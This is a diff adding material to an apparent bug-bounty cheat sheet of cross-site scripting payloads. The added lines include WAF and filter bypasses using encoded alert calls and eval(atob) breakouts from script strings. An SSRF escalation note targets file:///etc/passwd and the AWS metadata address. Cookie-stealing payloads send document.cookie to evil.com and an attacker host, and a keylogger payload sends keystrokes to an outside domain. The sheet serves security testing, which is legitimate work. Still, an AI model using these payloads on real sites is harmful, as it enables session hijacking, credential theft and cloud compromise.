@@ -14,6 +14,7 @@ Never submit a vulnerability with alert(1) show impact, use document.cookie and 
 <h2>Alert POC Alternatives</h2>
 If alert is blocked or filtered, first try confirm(1), print() or prompt(1).<br>
 Try URL Encoding the A on alert - %61lert(1). URL each char if this does not work using referemce - https://www.w3schools.com/tags/ref_urlencode.ASP <br>
+Try [%27al\x65rt%27](document.domain);//
 You dont need a popup for a POC, you can go straight to a cookie stealer POC. <br>
 <br>
 <h2>Identify what is being blocked</h2>
@@ -56,7 +57,18 @@ Injecting anchor tag without whitespaces -breaking up characters with decoded va
  This will work for script-src self: <br>
  <.object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object.> <br>
  <.object data="javascript:alert(1)".> (firefox) <br>
-
+<br>
+ <h3> XSS within Variables and scripts</h3>
+ '-alert(1)-' (if backslash escaped use the payload below) <br> 
+\'-alert(1)// <br>
+"+alert(1));<!-- <br>
+'-prompt(1)// <br>
+// generate string for this payload with btoa('alert(1)') <br>
+eval(atob('YWxlcnQoMSk=')) <br>
+\'-prompt(1)// <br>
+<br> 
+<h3>Tiny Payload<h3> <br>
+<.base href=//0> <br>
 <br>
 <h2>A href bypasses</h2>
 If exploiting <a. href></a> xss and "javasript" is blocked by WAF or URL then try the below. <br>
@@ -77,8 +89,22 @@ Can also use the below to get rid of the word JavaScript all together<br>
   <img src="https://pbs.twimg.com/media/Eir5smxXcAcJ4QX?format=jpg&name=large" width="800" height="600" title="hover text">
 </p>
 <br>
-
-
+<br>
+<h3>XSS when payload is reflected capitalized</h3> <br>
+<.IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1).><br>
+<br>
+<h3> SSRF Esculation </h3> <br>
+If you can get XSS within a pdf generator, try get ssrf via an iframe src=http://host or iframe src=file:///etc/passwd <br>
+Try with AWS 169.254.169.254 address if AWS <br>
+<br>
+<h3> Cookie harvestor </h3><br>
+<.img/src/onerror=document.location="http://evil.com:8090/cookiez.php?c="+document.cookie><br>
+<.script>new Image().src="http://evil.com:8090/b.php?"+document.cookie;<./script>
+<.svg onload=fetch("//attacker/r.php?="%2Bcookie).>
+<br>
+<h3> Keylogger </h3> <br>
+<.img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'> <br>
+<br>
 <h2>Blind Xss</h2>
 Similar to Reflected Xss Or Stored Xss But you Dont get any reflection, but you get response on you server. <br>
 <br>
